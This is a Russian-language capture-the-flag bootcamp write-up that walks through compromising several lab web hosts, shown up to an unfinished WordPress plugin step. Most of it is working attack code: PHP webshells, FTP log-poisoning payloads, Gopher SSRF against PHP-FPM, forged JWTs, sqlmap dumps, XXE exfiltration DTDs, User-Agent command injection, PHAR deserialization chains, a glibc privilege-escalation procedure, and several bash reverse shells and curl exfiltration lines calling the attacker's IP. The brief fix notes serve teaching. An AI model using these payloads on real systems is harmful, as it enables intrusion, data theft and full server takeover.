# Bootcamp Web Challenges Writeup: Десять машин, десять путей атаки

Подборка из десяти веб-задач из диапазона `*.edu.stf` bootcamp, разобранных от первичной разведки до полной компрометации. Каждая задача нацелена на свой класс уязвимостей, и каждый разбор содержит точные команды, рассуждения и места, где спрятаны ловушки.

Этот разбор предполагает, что машина Kali находится в той же VPN, что и целевая подсеть (`10.124.1.0/27`), с IP-адресом `tun0` равным `10.127.210.82`. При повторении замените его на IP своего интерфейса.

---

## Разведка

Начинаем с ping-сканирования диапазона /27:

```bash
nmap -sn 10.124.1.224/27
```

Ответили четырнадцать хостов. Прежде чем запускать полное сканирование портов, нужно учесть, что диапазон отвечает медленно (примерно 340 мс задержки через VPN), поэтому стандартный тайминг nmap делает каждый скан бесконечным. Есть два варианта:

- Для RustScan уменьшить размер батча и повысить таймаут: `-b 500 -t 3000`
- Для nmap ограничить RTT и число повторов:

```bash
nmap --initial-rtt-timeout 400ms --max-rtt-timeout 1s --max-retries 1 <targets>
```

Причина в том, что эвристика тайминга nmap неверно интерпретирует каналы с высокой задержкой. Когда пакет не возвращается в стандартное окно, nmap повторяет попытку до десяти раз на порт. При RTT 300+ мс через VPN это превращает 60-секундный скан в десять минут. Принудительный начальный таймаут чуть выше измеренного RTT (`400 мс` для канала с `340 мс`) сообщает nmap с первого пакета, что это медленный канал, и он не тратит время на «умные» решения. Ограничение максимального таймаута до `1s` и повторов до `1` предотвращает зависание сканирования на портах, которые реально фильтруются.

Сканирование портов по диапазону:

```bash
nmap 10.124.1.225 10.124.1.231 10.124.1.232 10.124.1.234 10.124.1.235 \
     10.124.1.236 10.124.1.237 10.124.1.238 10.124.1.239 10.124.1.240 \
     10.124.1.241 10.124.1.242 10.124.1.253
```

Затем обратный DNS через сервер DNS диапазона для получения имён хостов:

```bash
nmap -sP --dns-servers 10.124.1.240 10.124.1.224/27
```

Результаты связывают имена хостов с хостами:

| IP | Имя хоста | Заметные порты |
|----|-----------|---------------|
| 10.124.1.225 | (нет PTR) | все закрыты |
| 10.124.1.231 | aircraft.edu.stf | 22, 80 |
| 10.124.1.232 | calculator.edu.stf | 22, 80, 8080, 8888 |
| 10.124.1.233 | library.edu.stf | 22 |
| 10.124.1.234 | wp.edu.stf | 22, 80 |
| 10.124.1.235 | www.edu.stf | 21, 22, 80 |
| 10.124.1.236 | gallery.edu.stf | 22, 80 |
| 10.124.1.237 | utils.edu.stf | 22, 80 |
| 10.124.1.238 | shop.edu.stf | 22, 80, 9998, 9999 |
| 10.124.1.239 | tokenizer.edu.stf | 22, 80, 5432 |
| 10.124.1.240 | bind.edu.stf | 22, 53 |
| 10.124.1.241 | smashmusic.edu.stf | 22, 80 |
| 10.124.1.242 | test-webserver.edu.stf | 22, 80 |
| 10.124.1.253 | vpn.edu.stf | 443 |

Десять приведённых ниже задач соответствуют десяти веб-хостам.

---

## WEB 1 (library.edu.stf) — Загрузка файла с «добиванием» через ядро

В первичном сканировании виден только порт 22, что странно для «веб»-задачи. Полное сканирование портов показывает, что HTTP слушает только на loopback-интерфейсе, который первичный скан не затронул. Реальная поверхность атаки — эндпоинт загрузки файлов, доступный после того, как loopback-сервис выставлен наружу. Используемый инструмент — `ldd --version`, который выдаёт `glibc 2.36` — именно ту версию, что подвержена CVE-2023-4911 («Looney Tunables»).

Форма загрузки принимает `.png` по расширению, но сервер не проверяет content-type. Загрузка PHP-файла с расширением `.png` проходит, и сервер отдаёт его как `text/x-php` при запросе с определённой строкой запроса. Оттуда RCE достигается загрузкой маленького PHP-вебшелла.

Для локального повышения привилегий используется CVE-2023-4911. Публичный PoC — `looney-tunables-CVE-2023-4911` на GitHub (репозиторий hadrian3689). Шаги:

```bash
# На цели, как www-data после RCE
curl -O http://<kali>/gnu-acme.py
chmod +x gnu-acme.py
python3 gnu-acme.py
```

Скрипт полагается на то, что `ld-linux-x86-64.so.2` в системе имеет известный build ID. Для Debian 12 с `glibc 2.36-9+deb12u2` это `35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc`. Если build ID отсутствует в словаре TARGETS PoC, скрипт падает с ошибкой «no target info found». Решение — добавить build ID вручную. Извлеките его из `ld-linux` цели:

```bash
python3 -c "
import struct
with open('/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2','rb') as f:
    elf=f.read()
    idx=elf.find(b'GNU\x00')
    if idx>0:
        namesz=struct.unpack_from('<I',elf,idx-12)[0]
        descsz=struct.unpack_from('<I',elf,idx-8)[0]
        ntype=struct.unpack_from('<I',elf,idx-4)[0]
        name=elf[idx:idx+namesz]
        desc=elf[idx+namesz+((4-(namesz%4))%4):idx+namesz+((4-(namesz%4))%4)+descsz]
        if ntype==3 and name[:-1]==b'GNU':
            print('BuildID:', desc.hex())
"
```

Затем пропатчите PoC:

```bash
sed -i 's/TARGETS = {/TARGETS = {\n    "<build_id>": 561,/' gnu-acme.py
```

Значение смещения (561) — это параметр «adjust» `ld.so`, который заставляет настроенную раскладку памяти glibc столкнуться с переменными окружения `GLIBC_TUNABLES` эксплойта. Разные сборки `ld.so` попадают на разные смещения; 561, 580 и 560 распространены для диапазона 2.36. Если начальное смещение не срабатывает, попробуйте соседние.

Полный поток эксплойта на цели:

```bash
chmod +x *
python3 gnu-acme.py
gcc exp.c -o exp
./exp
cd /home
cat flag.txt
```

В момент завершения `exp` команда `id` возвращает `euid=0`.

**Почему это сработало:** Обход загрузки файлов был тривиальным (только проверка расширения, без MIME-сниффинга), а LPE использовала CVE, которая существовала месяцами до появления этой машины. Looney Tunables поражает `glibc 2.34+` на системах с установленным `AT_SECURE` (setuid-бинарники), поэтому любой setuid-бинарник — включая `su`, `passwd` или даже `mount` — является валидной целью запуска.

---

## WEB 2 (www.edu.stf) — LFI к отравлению логов к RCE

Два порта, которые nmap не отметил, выделяются: FTP на 21 и HTTP на 80. Начинаем с поиска директорий на стороне HTTP:

```bash
gobuster dir -u http://www.edu.stf/ -w /usr/share/wordlists/dirb/common.txt -k -t 50
gobuster dir -u http://www.edu.stf/api/ -w /usr/share/wordlists/dirb/common.txt -k -t 50 -x php
```

В директории `/api/` есть эндпоинт `read.php`, принимающий параметр `file`. Проверка LFI:

```bash
curl "http://www.edu.stf/api/read.php?file=/opt/cpu.txt"
curl "http://www.edu.stf/api/read.php?file=../../../../etc/pt.flag"
```

Оба возвращают содержимое — LFI подтверждён. Нет фильтра пути, нет ограничения `open_basedir`, нет проверки `realpath`. Это означает, что можно читать всё, что доступно пользователю `www-data`.

Интересный угол — отравление логов, потому что FTP тоже открыт. Файлы логов, записываемые сервисами от имени `www-data` — включая `vsftpd.log` — обычно читаемы `www-data`. Если внедрить PHP в файл лога и затем подключить его через LFI, получаем RCE без прямого касания файловой системы.

FTP-сервис принимает анонимные (или на этой машине — любые) логины и записывает имя пользователя в `vsftpd.log`. Отправка логина с PHP-пейлоад в качестве имени пользователя записывает пейлоад в лог:

```bash
lftp -u "<?php system(\$_GET['ci']); ?>,test123" ftp://10.124.1.235
```

Альтернативы, если `lftp` недоступен:

```bash
echo -e "USER <?php system(\$_GET['ci']); ?>\r\nPASS anything\r\n" | nc -w 3 10.124.1.235 21
```

Или через интерактивный `ftp -n`:

```
ftp -n 10.124.1.235
quote USER <?php system($_GET['ci']); ?>
quote PASS test123
quit
```

Теперь `vsftpd.log` содержит строку:

```
Mon Oct 13 ... [pid 123] CONNECT: Client "..." USER <?php system($_GET['ci']); ?>
```

Запрос `read.php` с `file=/var/log/vsftpd.log` заставляет `include()` PHP загрузить файл лога, распарсить PHP-тег и выполнить его. GET-параметр `ci` становится shell-командой:

```bash
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=id"
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=/home/rceflag"
```

Для реверс-шелла тот же канал:

```bash
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=bash%20-c%20'exec%20bash%20-i%20%3E%26%20/dev/tcp/10.127.210.82/4444%200%3E%261'"
```

Для LPE эта машина имеет тот же `glibc`, что и WEB 1, и тот же путь Looney Tunables. Сначала проверьте:

```bash
ldd --version
uname -a
cat /etc/os-release
```

Если `glibc` версии 2.36, применяется тот же PoC.

**Почему это сработало:** У LFI не было никаких ограничений пути — обход `../` через восемь уровней `..` сработал. Поле имени пользователя FTP не имело санитизации, а путь к логу FTP-сервера был предсказуемым и читаемым для пользователя веб-сервера. Объединение этих двух даёт неаутентифицированный RCE. Ошибка, против которой нужно защищаться: файловое включение должно использовать `realpath()` и белый список загружаемой директории, а лог-файлы с пользовательским вводом не должны быть исполняемым PHP.

---

## WEB 3 (utils.edu.stf) — SSRF с Gopherus к RCE через PHP-FPM

Сканирование директорий показывает эндпоинт `/convert.php`, который получает URL на стороне сервера. Форма принимает URL и возвращает отрендеренную страницу. Это кандидат в SSRF, и используемая серверная библиотека `curl` поддерживает Gopher, что открывает дверь к сырому TCP.

```bash
ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ \
     -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt \
     -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak \
     -fs 1018
```

Схема `file://` работает — эндпоинт читает локальные файлы. Чтение конфигурации nginx:

```bash
curl -s 'http://10.124.1.237/convert.php?url=file:///etc/nginx/sites-available/default' | head -100
```

Две ключевые строки в конфиге:

```
root /var/www/html;
fastcgi_pass 127.0.0.1:9000;
```

`fastcgi_pass 127.0.0.1:9000` означает, что PHP-FPM слушает на TCP-сокете, а не на Unix-сокете. Это и есть ловушка. PHP-FPM на 9000, когда с ним говорят по FastCGI, выполнит любой PHP-файл, который вы ему укажете, независимо от того, что Nginx бы разрешил.

Чтение самого `convert.php`:

```bash
curl -s 'http://10.124.1.237/convert.php?url=file:///var/www/html/convert.php'
```

Релевантный код:

```php
$url = $_REQUEST['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
```

Нет белого списка схем. curl поддерживает Gopher, поэтому SSRF к Gopher полностью открыт. Gopher позволяет отправлять произвольный сырой TCP — идеально для разговора по FastCGI с `127.0.0.1:9000`.

Gopherus автоматизирует сборку пейлоада FastCGI:

```bash
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
chmod +x install.sh
./install.sh
```

На современной машине установщик может упасть, если нет `python2`. Ручная установка:

```bash
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o /tmp/get-pip.py
sudo python2 /tmp/get-pip.py
sudo python2 -m pip install requests
python2 gopherus.py --exploit fastcgi
```

Gopherus спрашивает файл, который «наверняка присутствует на сервере» — подойдёт любой PHP-файл в корне веб-сервера, и `convert.php` сам по себе очевидный выбор. Команда для запуска может быть любой, включая запись полного PHP-вебшелла в `/tmp`:

```
Terminal command to run: /home/rceflag > /tmp/flag.txt
```

Выход — URL `gopher://`. Отправьте его через SSRF:

```bash
curl -s -o /dev/null 'http://10.124.1.237/convert.php?url=<gopher_url>'
```

Или, если URL содержит спецсимволы, URL-кодируйте через `curl -G`:

```bash
curl -G 'http://10.124.1.237/convert.php' --data-urlencode 'url=<gopher_url>'
```

Для RCE в реверс-шелл тот же канал:

```bash
# Записать PHP реверс-шелла
curl -o /tmp/shell.php http://10.127.210.82:8000/shell.php

# Триггер через Gopher
python2 gopherus.py --exploit fastcgi
# файл: /var/www/html/convert.php
# команда: php /tmp/shell.php
```

Затем отправьте возвращённый gopher URL в `convert.php?url=` и ловите реверс-шелл на слушателе. `php-reverse-shell.php` из `/usr/share/webshells/php/` вполне подойдёт — только поменяйте IP и порт внутри.

**Почему это сработало:** Сервер получал URL без белого списка схем и без блоклиста внутренних адресов. Поддержка Gopher в curl позволяла сырой TCP к loopback. PHP-FPM на TCP-сокете (а не на Unix-сокете) делал атаку на FastCGI тривиальной, поскольку Unix-сокеты требуют другой формат gopher-пейлоада и путь к файловой системе, который вы можете не знать.

**Исправление:** белый список http/https, блокировка диапазонов RFC1918 и loopback, отключение Gopher в обёртке curl, размещение PHP-FPM за Unix-сокетом с правильной установкой `listen.owner`/`listen.mode`.

---

## WEB 4 (shop.edu.stf) — Слив дампа БД и SQL-инъекция

`feroxbuster` на `http://shop.edu.stf`:

```bash
feroxbuster -u http://shop.edu.stf -s 200 -t 200 --insecure
```

В результатах:

```
200  GET  344l  1343w  10727c  http://shop.edu.stf/db/hellophones.sql
```

Сырой SQL-дамп лежит в корне веб-сервера. Получение:

```bash
curl http://shop.edu.stf/db/hellophones.sql
```

Дамп содержит таблицу `users` с колонками `userid`, `username`, `password`, `role`. Три строки:

| userid | username | password | role |
|--------|----------|----------|------|
| 4 | kwizera | 12345 | Manager |
| 5 | nemaroy | 12345 | Seller |
| 6 | irera | 12345 | Seller |

Обратите внимание на `hellophones` в имени файла — эта машина про магазин телефонов, и имя SQL-дампа выбрано для правдоподобия. Классическая ошибка: разработчик экспортировал схему, положил её в `/db/` для удобства и никогда не удалял.

Вход на `http://shop.edu.stf/index.php` с `kwizera / 12345`. Роль Manager даёт доступ к панели управления товарами.

Эндпоинт загрузки — `/Execute/ExChangePicture.php`. Тестируем:

```bash
curl -X POST http://shop.edu.stf/Execute/ExChangePicture.php \
  -b "PHPSESSID=<your_session>" \
  -F "IDUser=4" \
  -F "Image=@shell.php;type=application/octet-stream"
```

Сервер перемещает файл в `/assets/img/Profile_Uploaded/shell.php`. Нет проверки расширения, нет проверки MIME, нет проверки на изображение. Путь детерминирован (использует загруженное имя файла напрямую), поэтому вызов:

```bash
curl "http://shop.edu.stf/assets/img/Profile_Uploaded/shell.php?rev=id"
```

возвращает вывод `id` как `www-data`.

Реверс-шелл:

```bash
curl "http://shop.edu.stf/assets/img/Profile_Uploaded/shell.php?rev=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.127.210.82/4444%200%3E%261%27"
```

Сам `shell.php`:

```php
<?php echo system($_GET["rev"]); ?>
```

**Почему это сработало:** Резервный SQL-дамп в корне веб-сервера выдал админские учётные данные. Обработчик загрузки доверял предоставленному клиентом имени файла и content-type и отдавал результат с предсказуемого URL под тем же доменом. Любой из этих пунктов по отдельности достаточно, чтобы сломать машину.

---

## WEB 5 (tokenizer.edu.stf) — Подделка JWT с раскрытым секретом

Эндпоинт `check.php` на странице входа декодирует и проверяет JWT. Сначала подаём валидный токен:

```bash
curl "http://tokenizer.edu.stf/check.php?jwt=<valid_token>"
```

Ответ содержит декодированные заголовок и payload, а затем мусор — этот мусор является сырыми байтами HMAC-подписи. Payload:

```json
{
  "user": "James",
  "dir": "samples",
  "key": "qwerty",
  "timestamp": 1783860535
}
```

Три важных поля:
- `user: James` — заявленная идентичность
- `dir: samples` — директория для листинга
- `key: qwerty` — секрет HMAC, в открытом виде, в payload токена

Приложение настолько наивно, что кладёт ключ подписи внутрь payload. `qwerty` также длиной пять символов, вполне в пределах словарного перебора, но здесь даже брутфорс не нужен — ключ прямо перед нами.

Пересобираем токен на jwt.io (или локально через PyJWT):

```python
import jwt, time
token = jwt.encode({
    "user": "admin",
    "dir": "admin",
    "key": "qwerty",
    "timestamp": int(time.time()) + 3600
}, "qwerty", algorithm="HS256")
print(token)
```

Поле `dir` имеет значение. Сервер листает файлы из директории, указанной в `dir`. Установка `admin` (или `.` для корня приложения) раскрывает другие файлы. Отправляем поддельный токен:

```bash
curl "http://tokenizer.edu.stf/check.php?jwt=<forged_token>"
```

В ответе перечисляются:

```
samples
composer.json
vendor
token.php
index.html
supersecretadminloginyoullneverguess.php
composer.lock
..
check.php
.
```

Два интересных имени: `token.php` (вероятно, логика генерации токенов) и абсурдно названный вход администратора. Получаем оба:

```bash
curl "http://tokenizer.edu.stf/supersecretadminloginyoullneverguess.php"
```

Страница входа админа принимает POST-форму. Вход с `admin:admin` успешен, и админ-панель предоставляет поисковый интерфейс, уязвимый к SQL-инъекции.

Для инъекции перехватите запрос в Burp или постройте вручную:

```
POST /supersecretadminloginyoullneverguess.php HTTP/1.1
Host: tokenizer.edu.stf
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<your_session>
Connection: keep-alive

name=1&address=1&phone=1&email=1&plan=1&submit_search=Submit
```

Сохраните в `/tmp/pack` и запустите sqlmap:

```bash
sqlmap -r pack --level=5 --risk=3 --dbms=postgresql -p phone --dbs --batch --random-agent
```

DBMS — PostgreSQL (подтверждено портом 5432 в первичном скане). Базы данных:

```
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

Таблицы в `public`:

```bash
sqlmap -r pack --level=5 --risk=3 --tables -D public --batch --random-agent
```

```
+--------------+
| clients_data |
| secret       |
+--------------+
```

Колонки в `secret`:

```bash
sqlmap -r pack --level=5 --risk=3 --columns -D public -T secret --batch --random-agent
```

```
+--------+--------+
| Column | Type   |
+--------+--------+
| flag   | bpchar |
| id     | int4   |
+--------+--------+
```

Дамп:

```bash
sqlmap -r pack --level=5 --risk=3 --dump -D public -T secret --batch --random-agent
```

**Почему это сработало:** Три независимые проблемы наложились друг на друга. Секрет подписи был встроен в payload токена, поэтому подделка была тривиальной. Параметр `dir` использовался как путь к директории на стороне сервера без валидации, раскрывая скрытые файлы. А форма поиска в админ-панели не была параметризована, позволяя стекированные SQL-запросы к бэкенду PostgreSQL.

**Исправление:** никогда не класть секрет подписи в токен, использовать параметризованные запросы, помещать админ-панель за второй фактор.

---

## WEB 6 (smashmusic.edu.stf) — Обход аутентификации с захардкоженным ключом

Сканирование директорий:

```bash
gobuster dir -u http://10.124.1.241/ -w /usr/share/wordlists/dirb/common.txt -k -t 50 -x php,html,pdf,js
```

Заметные пути: `/phpmyadmin`, `/secret/`, `/uploads/`, `/core/`, `/vendor/`. Директория `/uploads/` принимает файлы, `/secret/` — админ-зона.

`/uploads/sh.phtml` уже существует от предыдущего тестировщика (или из подготовленного окружения). Тестируем:

```bash
curl "http://10.124.1.241/uploads/sh.phtml?cmd=id"
```

Возвращает `www-data`. Это вебшелл, оставленный кем-то другим. Чтобы понять, как он работает, читаем `/core/authenticate.php`:

```bash
curl "http://10.124.1.241/uploads/sh.phtml?cmd=cat+/var/www/html/core/authenticate.php"
```

Релевантная строка:

```php
private $key = 'hetfield_';
```

Захардкоженный ключ подписи JWT. Теперь мы можем подделать валидный админский токен. Читаем `/js/auth.js` для понимания потока входа:

```javascript
url: "core/userLogin.php",
type: "POST",
contentType: "application/json",
data: datas,
...
Cookies.set("jwt", result, 0);
$(location).attr('href','secret/secretPanel.php');
```

Эндпоинт входа ожидает JSON с `username` и `password`. JWT хранится в куке с именем `jwt`. После входа редирект ведёт на `secret/secretPanel.php`.

Брутфорс логина через Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.1.241 http-post-form \
  "/core/userLogin.php:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:eyJ" \
  -t 30
```

`:eyJ` — это поиск строки неудачи: любой ответ, содержащий `eyJ`, означает, что вернулся валидный JWT. Учётные данные: `admin:123456`.

Логин возвращает JWT, подписанный через `hetfield_`. Можно также подделать напрямую:

```python
import jwt, time
token = jwt.encode({
    "name": "admin",
    "email": "admin@musick.com",
    "iss": "localhost",
    "aud": "localhost",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400
}, "hetfield_", algorithm="HS256")
```

Отправляем в админ-панель:

```bash
curl -b "jwt=<token>" http://10.124.1.241/secret/secretPanel.php
```

В панели есть форма загрузки на `secret/uploadMusic.php`. Загрузка принимает `.phtml` файлы:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml

curl -X POST http://10.124.1.241/secret/uploadMusic.php \
  -H "Cookie: jwt=<token>" \
  -F "userfile=@shell.phtml;type=audio/mpeg" \
  -F "upload_btn=Upload"
```

Триггер:

```bash
curl "http://10.124.1.241/uploads/shell.phtml?cmd=id"
curl "http://10.124.1.241/uploads/shell.phtml?cmd=/home/rceflag"
```

**Почему это сработало:** Приложение явно собиралось в спешке — секрет JWT был захардкожен в `authenticate.php`, а обработчик загрузки пропускал `.phtml` (Apache интерпретирует `.phtml` как PHP по умолчанию, когда загружен `mod_php`). Дефолт `admin:123456` тоже не помог.

---

## WEB 7 (test-webserver.edu.stf) — XXE к RCE через инъекцию в User-Agent

Машина предоставляет один эндпоинт, который парсит XML из тела запроса. Чтение README самого приложения намекает на задуманный путь:

```bash
curl -s http://10.124.1.242/README.md
```

Файл содержит одну строку: `libxml_disable_entity_loader`. Это PHP-функция. Намёк на то, что приложение её не вызывает, значит внешние сущности включены по умолчанию. XXE включён.

Сначала подтверждаем OOB через interactsh:

```bash
interactsh-client
```

Получим домен вроде `d9bhc62o12pi2daaije0d7szq86ntamfy.oast.live`. Отправляем пейлоад с внешней сущностью, указывающей на него:

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/xml
Content-Length: 144
Connection: close

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://d9bhc62o12pi2daaije0d7szq86ntamfy.oast.live/test">
]>
<test>&xxe;</test>
```

Interactsh показывает DNS и HTTP-хиты. Blind XXE подтверждён.

Для эксфильтрации файлов размещаем вредоносный DTD на машине Kali:

```bash
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.127.210.82/?f=%file;'>">
%eval;
EOF
cd /tmp && python3 -m http.server 80
```

Обёртка `php://filter/convert.base64-encode` позволяет PHP кодировать содержимое файла в base64 перед эксфильтрацией — необходимо, потому что сырой `/etc/passwd` содержит пробелы и переводы строк, которые ломают XML.

Отправляем XXE-пейлоад, указывающий на DTD:

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/xml
Content-Length: 146
Connection: close

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://10.127.210.82/evil.dtd">
  %remote;
  %exfil;
]>
<test>hello</test>
```

HTTP-сервер логирует:

```
GET /?f=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4K... HTTP/1.0
```

Декодируйте с `base64 -d`, чтобы получить `/etc/passwd`.

Читаем исходник приложения тем же способом:

```bash
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.127.210.82/?f=%file;'>">
%eval;
EOF
```

Декодированный исходник содержит:

```php
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
...
$user_agent = $_SERVER['HTTP_USER_AGENT'];
exec("echo '".$user_agent."' | grep Firefox", $output, $return);
```

Две проблемы в одном файле:
1. `LIBXML_NOENT | LIBXML_DTDLOAD` включает разрешение внешних сущностей
2. `exec("echo '".$user_agent."' | grep Firefox")` — прямая строковая интерполяция заголовка User-Agent в shell-команду

Поле `User-Agent` инъектируемо. Отправляем:

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: '; curl http://10.127.210.82/?rce=$(whoami|base64); '
Content-Type: application/xml
Content-Length: 47
Connection: close

<?xml version="1.0"?>
<test>hello</test>
```

Выполняемая команда становится:

```
echo '' ; curl http://10.127.210.82/?rce=$(whoami|base64); '' | grep Firefox
```

Что запускает `curl` с `whoami`, переданным через base64 как параметр запроса. HTTP-сервер Kali логирует запрос:

```
GET /?rce=d3d3LWRhdGEK HTTP/1.0
```

Декодируем `d3d3LWRhdGEK` → `www-data`. RCE подтверждён.

Реверс-шелл:

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: '; bash -c "bash -i >& /dev/tcp/10.127.210.82/4444 0>&1"; '
Content-Type: application/xml
Content-Length: 47
Connection: close

<?xml version="1.0"?>
<test>hello</test>
```

Ловим:

```bash
nc -lvnp 4444
```

**Почему это сработало:** Две ошибки в одном файле. `libxml_disable_entity_loader(false)` открывает XXE; `exec("echo '".$user_agent."'")` даёт инъекцию команд через заголовок. Любой из них в одиночку был бы достаточен. XXE сам по себе даёт чтение файла; инъекция команд сама по себе даёт RCE от имени `www-data`.

---

## WEB 8 (gallery.edu.stf) — Десериализация PHAR через загрузку URL

Два эндпоинта PHP в `curl` возвращают 200 с пустым телом, поэтому исходник нужно извлечь другим путём. Эндпоинт `/ajax.php` принимает параметры `action` и `imageURL`. Тестируем:

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=../../../etc/passwd"
```

Возвращает путь вроде `/images/c542155ebe0034790afc9c47390fbe802cf823.txt` — это MD5-хэш содержимого файла плюс случайный префикс. Приложение копирует содержимое полученного URL в `images/`, так что у нас произвольная запись файлов.

Читаем исходник приложения:

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=./classes.php"
```

Ответ содержит содержимое `classes.php`. Два файла важны:

**`classes.php`** содержит класс с `__destruct`:

```php
class ImageSorting {
    public $ImageArr;
    public $SortFunc;

    function __destruct() {
        usort($this->ImageArr, $this->SortFunc);
    }
}
```

`usort()` с контролируемым callback — классический гаджет: `usort(["id"], "system")` вызывает `system("id")`. `__destruct` срабатывает, когда объект выходит из области видимости.

**`ajax.php`** содержит обработчик загрузки:

```php
array_push($uploAdsArr, Array($files[$i2], filemtime('./images/'.$files[$i2])));
```

**`classes.php`** также содержит:

```php
copy($this->ImageUrl, $_SERVER["DOCUMENT_ROOT"].$ImageName);
```

`copy($this->ImageUrl, ...)` принимает любой stream wrapper. `phar://` — это wrapper. И любая файловая операция с путём `phar://` — даже `file_exists` или `md5_file` — триггерит десериализацию секции метаданных PHAR.

Вот полная цепочка:
1. Собрать PHAR с `ImageSorting` в метаданных
2. Загрузить через `imageURL=http://kali/exploit.phar`
3. Триггернуть десериализацию через `imageURL=phar://./images/<hash>.txt`

Сборка PHAR на Kali:

```bash
cat > /tmp/create_phar.php << 'EOF'
<?php
class ImageSorting {
    public $ImageArr = Array();
    public $SortFunc = "system";
}
$payload = new ImageSorting();
$payload->ImageArr = ["id", "x"];
$payload->SortFunc = "system";
@unlink("exploit.phar");
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setMetadata($payload);
$phar->stopBuffering();
echo "[+] exploit.phar created\n";
EOF

php -d phar.readonly=0 /tmp/create_phar.php
```

`phar.readonly=0` обязателен, потому что PHP отказывается создавать архивы PHAR, когда `phar.readonly` включён (по умолчанию).

Размещаем:

```bash
cd /tmp && python3 -m http.server 80
```

Загружаем с целевой стороны:

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=http://10.127.210.82/exploit.phar"
```

Ответ даёт скопированный путь, например `/images/abc123def456.txt`. Теперь триггерим:

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=phar://./images/abc123def456.txt"
```

В момент, когда `copy()` или `md5_file()` (что сработает первым) касается обёртки `phar://`, PHP десериализует метаданные в объект `ImageSorting`. Когда объект собирается GC в конце запроса, `__destruct` запускает `usort(["id", "x"], "system")`, что вызывает `system("id")`.

Для полного реверс-шелла:

```bash
cat > /tmp/create_phar2.php << 'EOF'
<?php
class ImageSorting {
    public $ImageArr = Array();
    public $SortFunc = "system";
}
$ip = "10.127.210.82";
$port = "4444";
$cmd = "bash -c 'exec bash -i &>/dev/tcp/{$ip}/{$port} <&1'";
$payload = new ImageSorting();
$payload->ImageArr = [$cmd, "x"];
$payload->SortFunc = "system";
@unlink("exploit2.phar");
$phar = new Phar("exploit2.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setMetadata($payload);
$phar->stopBuffering();
EOF

php -d phar.readonly=0 /tmp/create_phar2.php
```

Шаги загрузки и триггера идентичны — просто замените `exploit.phar` на `exploit2.phar`.

**Почему это сработало:** Комбинация «пользовательский путь файла передан в `copy()`» и «класс-гаджет с `__destruct` и контролируемым callback». Десериализация PHAR особенно коварна, потому что обходит обычный аудиторский след `unserialize()` — любая файловая операция с URI `phar://` десериализует метаданные, даже такая невинная, как `file_exists`.

**Исправление:** никогда не передавать контролируемые пользователем строки в `copy()`/`file_exists()`/`md5_file()` без белого списка схем. Ограничить использование `phar://` доверенными архивами. И аудировать классы-гаджеты на `__destruct`, `__wakeup`, `__toString` и подобные магические методы с контролируемыми свойствами.

---

## WEB 9 (wp.edu.stf) — RCE плагина WordPress, повышение через PostgreSQL, побег из Docker

Это самая длинная цепочка в диапазоне. WordPress 5.8.3 с плагином `simple-file-list` версии 4.1.3. Плагин уязвим к CVE-2020-36847 (неаутентифицированная загрузка файлов → RCE).

Проверка версии плагина:

```bash
curl -s http://wp.edu.stf/wp-content/plugins/simple-file-list/readme.txt | head -10
```

`Stable tag: 4.1.3` — уязвим.

Движок загрузки плагина (`ee-upload-engine.php`) и файловый движок (`ee-file-engine.php`) принимают запросы без аутентификации. Защита CSRF — это токен вида `MD5("unique_salt" + timestamp)`, а `unique_salt` — константа, вшитая в исходник плагина (видна из readme или чтения исходников).

Запрос загрузки:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.png

